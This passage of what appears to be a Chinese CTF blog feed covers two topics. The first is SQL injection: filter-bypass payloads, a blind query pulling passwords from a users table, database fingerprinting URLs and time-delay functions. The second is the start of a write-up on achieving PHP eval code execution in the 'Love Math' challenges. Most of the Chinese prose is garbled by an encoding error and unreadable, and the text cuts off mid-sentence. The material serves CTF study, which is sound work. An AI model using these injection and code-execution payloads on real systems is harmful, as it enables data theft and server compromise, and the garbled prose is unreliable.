‡å‡†ä¸­ã€‚</p></blockquote></li><li><p>è¿‡æ»¤â€™(å•å¼•å·)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span><br><span class="hljs-string">è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string">ç»•è¿‡æ–¹å¼ 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤hex</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-string">&#x27;</span><br><span class="hljs-string">è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="hljs-string">ç»•è¿‡æ–¹å¼ 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #åè¿›åˆ¶çš„11è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶å°å†™ã€‚</span><br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤substr</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-operator">|</span>substr<span class="hljs-string">&#x27;</span><br><span class="hljs-string">è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span><br><span class="hljs-string">ç»•è¿‡æ–¹å¼ 1 &amp;&amp; lpad(user(),1,1) in &#x27;</span>r<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤é€—å·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>è¿‡æ»¤äº†é€—å·æ€ä¹ˆåŠï¼Ÿå°±ä¸èƒ½å¤šä¸ªå‚æ•°äº†å—ï¼Ÿ<br><span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>);ä¸<span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span> <span class="hljs-keyword">FROM</span> <span class="hljs-number">6</span> <span class="hljs-keyword">FOR</span> <span class="hljs-number">5</span>);<br>æ„æ€ç›¸åŒ<br>substræ”¯æŒè¿™æ ·çš„è¯­æ³•ï¼š<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos <span class="hljs-keyword">FOR</span> len)<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos)<br>MID()åç»­åŠ å…¥äº†è¿™ç§å†™æ³•<br></code></pre></td></tr></table></figure></li></ul><h3 id="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"><a href="#ç­‰ä»·å‡½æ•°æˆ–å˜é‡" class="headerlink" title="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"></a>ç­‰ä»·å‡½æ•°æˆ–å˜é‡</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()ã€bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br>mid()ã€substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br> <br>ä¸¾ä¾‹ï¼š<span class="hljs-built_in">substring</span>()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span> pwd <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>ã€€<br> <br>æˆ–è€…ï¼š<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h4 id="åå¼•å·ç»•è¿‡"><a href="#åå¼•å·ç»•è¿‡" class="headerlink" title="åå¼•å·ç»•è¿‡"></a>åå¼•å·ç»•è¿‡</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `version()`  å¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å½“ä½œæ³¨é‡Šç¬¦ç”¨<br></code></pre></td></tr></table></figure><h1 id="åˆ¤æ–­æ•°æ®åº“ç±»å‹"><a href="#åˆ¤æ–­æ•°æ®åº“ç±»å‹" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“ç±»å‹"></a>åˆ¤æ–­æ•°æ®åº“ç±»å‹</h1><h3 id="å‰ç«¯ä¸æ•°æ®åº“ç±»å‹"><a href="#å‰ç«¯ä¸æ•°æ®åº“ç±»å‹" class="headerlink" title="å‰ç«¯ä¸æ•°æ®åº“ç±»å‹"></a>å‰ç«¯ä¸æ•°æ®åº“ç±»å‹</h3><p>aspï¼šSQL Serverï¼ŒAccess<br>.netï¼šSQL Server<br>phpï¼šMySQLï¼Œ<a href="https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020">PostgreSQL</a><br>javaï¼šOracleï¼ŒMySQL</p><h2 id="æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­"><a href="#æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­" class="headerlink" title="æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­"></a>æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­</h2><h3 id="lenå’Œlength"><a href="#lenå’Œlength" class="headerlink" title="lenå’Œlength"></a>lenå’Œlength</h3><p><code>len()</code>ï¼šSQL Server ã€MySQLä»¥åŠdb2è¿”å›é•¿åº¦çš„å‡½æ•°ã€‚<br><code>length()</code>ï¼šOracleå’ŒINFORMIXè¿”å›é•¿åº¦çš„å‡½æ•°ã€‚</p><h3 id="versionå’Œ-version"><a href="#versionå’Œ-version" class="headerlink" title="versionå’Œ@@version"></a>versionå’Œ@@version</h3><p><code>version()</code>ï¼šMySQLæŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯çš„å‡½æ•°<br><code>@@version</code>ï¼šMySQLå’ŒSQL ServeræŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯çš„å‡½æ•°</p><h3 id="substringå’Œsubstr"><a href="#substringå’Œsubstr" class="headerlink" title="substringå’Œsubstr"></a>substringå’Œsubstr</h3><p>MySQLä¸¤ä¸ªå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨<br>Oracleåªå¯è°ƒç”¨substr<br>SQL Serveråªå¯è°ƒç”¨substring</p><h3 id="æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­"><a href="#æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­" class="headerlink" title="æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­"></a>æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­</h3><p>&#x2F;*æ˜¯MySQLæ•°æ®åº“çš„æ³¨é‡Šç¬¦<br>â€“æ˜¯Oracleå’ŒSQL Serveræ”¯æŒçš„æ³¨é‡Šç¬¦<br>;æ˜¯å­å¥æŸ¥è¯¢æ ‡è¯†ç¬¦ï¼ŒOracleä¸æ”¯æŒå¤šè¡ŒæŸ¥è¯¢ï¼Œè‹¥è¿”å›é”™è¯¯ï¼Œåˆ™è¯´æ˜å¯èƒ½æ˜¯Oracleæ•°æ®åº“<br>#æ˜¯MySQLä¸­çš„æ³¨é‡Šç¬¦ï¼Œè¿”å›é”™è¯¯åˆ™è¯´æ˜å¯èƒ½ä¸æ˜¯MySQLï¼Œå¦å¤–MySQLä¹Ÿæ”¯æŒâ€“ å’Œ&#x2F;**&#x2F;</p><h3 id="æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­"><a href="#æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­" class="headerlink" title="æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­"></a>æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­</h3><p>MySQL<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and â€˜aâ€™+â€™bâ€™&#x3D;â€™abâ€™<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(â€˜aâ€™,â€™bâ€™)&#x3D;â€™abâ€™<br>Oracle<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and â€˜aâ€™||â€™bâ€™&#x3D;â€™abâ€™<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(â€˜aâ€™,â€™bâ€™)&#x3D;â€™abâ€™<br>SQL Server<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and â€˜aâ€™+â€™bâ€™&#x3D;â€™abâ€™ </p><h3 id="æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­"><a href="#æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­" class="headerlink" title="æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­"></a>æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­</h3><p>MySQLï¼ˆversion&gt;5.0ï¼‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from information_schema.TABLES)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Oracle</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sys.user_tables)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>SQL Server</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sysobjects)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­"><a href="#æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­" class="headerlink" title="æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­"></a>æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­</h3><p>MySQL</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">BENCHMARK</span><span class="hljs-params">(<span class="hljs-number">1000000</span>,ENCODE(<span class="hljs-string">&#x27;QWE&#x27;</span>,<span class="hljs-string">&#x27;ASD&#x27;</span>)</span></span>)<br><span class="hljs-function"><span class="hljs-title">SLEEP</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span><br></code></pre></td></tr></table></figure><p>PostgreSQL</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PG_SLEEP(<span class="hljs-number">5</span>)<br>GENERATE_SERIES(<span class="hljs-number">1</span>,<span class="hljs-number">1000000</span>)<br></code></pre></td></tr></table></figure><p>SQL Server</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WAITFOR</span> DELAY &#x27;<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>&#x27;<br></code></pre></td></tr></table></figure><p>âš ï¸å¾…è¡¥å…… <a href="https://www.freebuf.com/articles/web/261524.html">ç‚æŠ€ç³»åˆ—ä¹‹ä¸€ç¯‡å°±å¤Ÿäº†â€”â€”mysqlæ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>[å¯¹MYSQLæ³¨å…¥ç›¸å…³å†…å®¹åŠéƒ¨åˆ†Trickçš„å½’ç±»å°ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£</title>
      <link href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
      <url>/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£"><a href="#phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£" class="headerlink" title="phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£"></a>phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£</h1><h2 id="0x00é¢˜ç›®èƒŒæ™¯"><a href="#0x00é¢˜ç›®èƒŒæ™¯" class="headerlink" title="0x00é¢˜ç›®èƒŒæ™¯"></a>0x00é¢˜ç›®èƒŒæ™¯</h2><p>æ¥è‡ª2019å›½èµ›love mathï¼Œä»¥åŠ[NESTCTF 2019]Love Math 2ï¼Œä¸¤é¢˜çš„åŒºåˆ«åœ¨äºå¯¹payloadçš„é•¿åº¦é™åˆ¶ä¸åŒ</p><h3 id="ç›¸å…³è¿‡æ»¤"><a href="#ç›¸å…³è¿‡æ»¤" class="headerlink" title="ç›¸å…³è¿‡æ»¤"></a>ç›¸å…³è¿‡æ»¤</h3><p>é•¿åº¦é™åˆ¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">60</span>) &#123;<span class="hljs-comment">//å›½èµ›é™åˆ¶80</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é»‘åå•ç‰¹æ®Šå­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br></code></pre></td></tr></table></figure><p>ç™½åå•å‡½æ•°ï¼ˆéƒ½ä¸ºmathå‡½æ•°ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <span class="hljs-comment">//æå–payloadä¸­å‡½æ•°ååŠå˜é‡å</span><br></code></pre></td></tr></table></figure><blockquote><p>phpå‚è€ƒæ‰‹å†Œä¸­æåˆ°ï¼Œç”¨äºåŒ¹é…phpæœ‰æ•ˆå˜é‡åï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™<code>[a-zA-Z_/x7f-/xff][a-zA-Z0-9_/x7f-/xff]*</code> å› æ­¤payloadä¸­è‹¥ä½¿ç”¨å˜é‡ï¼Œå‘½åå¿…é¡»åœ¨ç™½åå•å‡½æ•°ä¸­é€‰æ‹©,å¦‚æœæ˜¯æ•°ç»„ç´¢å¼•ä¹Ÿå¯ä»¥ç”¨çº¯æ•°å­—(ä¸ç¬¦åˆå˜é‡åå‘½åæ³•åˆ™)</p></blockquote><h3 id="åˆ©ç”¨ç‚¹"><a href="#åˆ©ç”¨ç‚¹" class="headerlink" title="åˆ©ç”¨ç‚¹"></a>åˆ©ç”¨ç‚¹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>evalå‡½æ•°å‚æ•°è‹¥æ˜¯å­—ç¬¦ä¸²ï¼Œå¿…é¡»ç¬¦åˆphpä»£ç è¯­æ³•ï¼Œå› æ­¤å¯ä»¥æ’å…¥å¤šè¡Œä»£ç </p></blockquote><h2 id="0x01-åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å"><a href="#0x01-åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å" class="headerlink" title="0x01 åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å"></a>0x01 åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å</h2><h3 id="è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯"><a href="#è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯" class="headerlink" title="è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯"></a>è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯</h3><p>åˆ©ç”¨åˆ°è¿›åˆ¶è½¬æ¢ï¼Œä»11è¿›åˆ¶åˆ°36è¿›åˆ¶å‡æœ‰å°å†™å­—æ¯ï¼Œåœ¨ä¿è¯è½¬æ¢ç»“æœç®€æ´åŠçº¯æ•°å­—çš„æƒ…å†µä¸‹ï¼Œé€‰æ‹©36è¿›åˆ¶è½¬10è¿›åˆ¶(36è¿›åˆ¶å«a-z)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å…ˆåå‘</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//15941</span><br><span class="hljs-comment">//è¿™æ ·å°±å¯ä»¥ç”¨çº¯æ•°å­—é€šè¿‡ä¸‰åå…­è¿›åˆ¶è½¬æ¢å¾—åˆ°çº¯å­—æ¯å­—ç¬¦ä¸²äº†</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<span class="hljs-comment">//cat</span><br></code></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ"><a href="#å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ" class="headerlink" title="å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ"></a>å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ</h3><h4 id="å¼‚æˆ–æ€§è´¨"><a href="#å¼‚æˆ–æ€§è´¨" class="headerlink" title="å¼‚æˆ–æ€§è´¨"></a>å¼‚æˆ–æ€§è´¨</h4><ol><li>ç»“åˆå¾‹a ^ b ^ c &#x3D; a ^ c ^ b</li><li>äº¤æ¢å¾‹a ^ b &#x3D; b ^ a</li><li>æ•°å€¼äº¤æ¢ï¼ˆèƒ½äº¤æ¢ a ä¸ b çš„å€¼ï¼‰a &#x3D; a ^ b; b &#x3D; a ^ b; a &#x3D; a ^ b;</li><li>a^b^b&#x3D;a</li></ol><h4 id="phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ"><a href="#phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ" class="headerlink" title="phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ"></a>phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ</h4><ul><li><p>é•¿åº¦ä¸€è‡´çš„å­—ç¬¦ä¸²å¼‚æˆ–ï¼Œå¯¹åº”å­—ç¬¦å„è‡ªè½¬æ¢æˆasciiç å€¼å¼‚æˆ–åå¾—åˆ°æ–°å­—ç¬¦ï¼Œç»„æˆæ–°å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*\/&quot;</span>;<span class="hljs-comment">//^=A</span><br></code></pre></td></tr></table></figure></li><li><p>é•¿åº¦ä¸ä¸€è‡´çš„å­—ç¬¦ä¸²å¼‚æˆ–ï¼ŒæŒ‰æœ€çŸ­çš„å­—ç¬¦ä¸²é•¿åº¦æŒ‰ä½å¼‚æˆ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*&quot;</span>;<span class="hljs-comment">//^</span><br></code></pre></td></tr></table></figure></li></ul><p>å¼‚æˆ–å­—ç¬¦ä¸²å¯ä»¥æ„é€ å‡ºæ–°å­—ç¬¦ï¼Œä½†åªç”¨ç™½åå•çš„å‡½æ•°åçš„è¯ï¼Œå¤§å¤šæ˜¯asciiç å€¼æ¥è¿‘çš„å°å†™å­—æ¯ï¼Œå¼‚æˆ–åå¾—åˆ°çš„ä¹Ÿå¤šæ˜¯asciiç 